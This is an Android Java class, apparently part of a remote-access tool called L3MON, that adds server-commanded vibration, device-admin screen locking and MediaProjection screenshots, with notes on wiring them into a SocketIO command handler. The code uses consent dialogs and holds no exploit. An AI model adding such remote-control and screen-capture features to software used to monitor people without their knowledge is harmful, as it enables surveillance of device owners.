package com.etechd.l3mon;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Bundle;
import android.os.VibrationEffect;
import android.os.Vibrator;
import android.os.VibratorManager;

/**
 * MDM Corporate Action Handler.
 * Handles Screenshot, Screen Lock, and Vibration triggered by server commands.
 * 
 * HOW TO INTEGRATE:
 * 1. In your SocketIO "order" event handler inside ConnectionManager.java,
 *    add cases for "0xVB", "0xLK", and "0xSC" (screenshot).
 * 2. Call the static methods from this class.
 * 3. Add permissions and components to AndroidManifest.xml (see manifest_additions.xml).
 */
public class MDMActionHandler {

    private static final int REQUEST_SCREENSHOT = 1001;

    // ─── VIBRATION ──────────────────────────────────────────────────────────────

    /**
     * Makes the device vibrate for the given duration in milliseconds.
     * Compatible with Android 8+ (API 26+) and older versions.
     * 
     * Usage in ConnectionManager.java:
     *   case "0xVB":
     *       MDMActionHandler.vibrate(context, 1000);
     *       break;
     */
    public static void vibrate(Context context, long durationMs) {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                // Android 12+ (API 31+)
                VibratorManager vm = (VibratorManager) context.getSystemService(Context.VIBRATOR_MANAGER_SERVICE);
                if (vm != null) {
                    vm.getDefaultVibrator().vibrate(
                        VibrationEffect.createOneShot(durationMs, VibrationEffect.DEFAULT_AMPLITUDE)
                    );
                }
            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                // Android 8+ (API 26+)
                Vibrator v = (Vibrator) context.getSystemService(Context.VIBRATOR_SERVICE);
                if (v != null) {
                    v.vibrate(VibrationEffect.createOneShot(durationMs, VibrationEffect.DEFAULT_AMPLITUDE));
                }
            } else {
                // Older Android (API < 26)
                Vibrator v = (Vibrator) context.getSystemService(Context.VIBRATOR_SERVICE);
                if (v != null) {
                    v.vibrate(durationMs);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // ─── SCREEN LOCK ────────────────────────────────────────────────────────────

    /**
     * Instantly locks the device screen using DevicePolicyManager.
     * REQUIRES the user to have granted Device Administrator rights to this app.
     *
     * Usage in ConnectionManager.java:
     *   case "0xLK":
     *       MDMActionHandler.lockScreen(context);
     *       break;
     *
     * IMPORTANT: The user must grant Device Admin rights first via:
     *   Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
     *   intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponentName);
     *   startActivity(intent);
     */
    public static void lockScreen(Context context) {
        try {
            DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName adminComponent = new ComponentName(context, MDMDeviceAdminReceiver.class);

            if (dpm != null && dpm.isAdminActive(adminComponent)) {
                dpm.lockNow();
            } else {
                // If not admin yet, request admin rights
                Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
                intent.putExtra(
                    DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                    "Para el bloqueo remoto corporativo, esta aplicación necesita privilegios de administrador de dispositivo."
                );
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(intent);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // ─── SCREENSHOT (MediaProjection) ───────────────────────────────────────────

    /**
     * Initiates a screenshot capture using the official MediaProjection API.
     * This REQUIRES a visible system dialog ("¿Comenzar ahora?") — it cannot be bypassed.
     * 
     * Call this from MainActivity.java when a "0xSC" command is received.
     * The result is returned in onActivityResult and then passed to ScreenCaptureService.
     *
     * Usage in MainActivity.java:
     *   case "0xSC":
     *       MDMActionHandler.requestScreenCapture(this);
     *       break;
     *
     * Then in MainActivity.onActivityResult:
     *   if (requestCode == MDMActionHandler.REQUEST_SCREENSHOT && resultCode == RESULT_OK) {
     *       MDMActionHandler.startScreenCaptureService(this, data);
     *   }
     */
    public static void requestScreenCapture(Activity activity) {
        MediaProjectionManager manager =
            (MediaProjectionManager) activity.getSystemService(Context.MEDIA_PROJECTION_SERVICE);
        if (manager != null) {
            activity.startActivityForResult(
                manager.createScreenCaptureIntent(),
                REQUEST_SCREENSHOT
            );
        }
    }

    public static void startScreenCaptureService(Context context, Intent projectionData) {
        Intent serviceIntent = new Intent(context, ScreenCaptureService.class);
        serviceIntent.putExtra("RESULT_CODE", Activity.RESULT_OK);
        serviceIntent.putExtra("RESULT_DATA", projectionData);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(serviceIntent);
        } else {
            context.startService(serviceIntent);
        }
    }
}
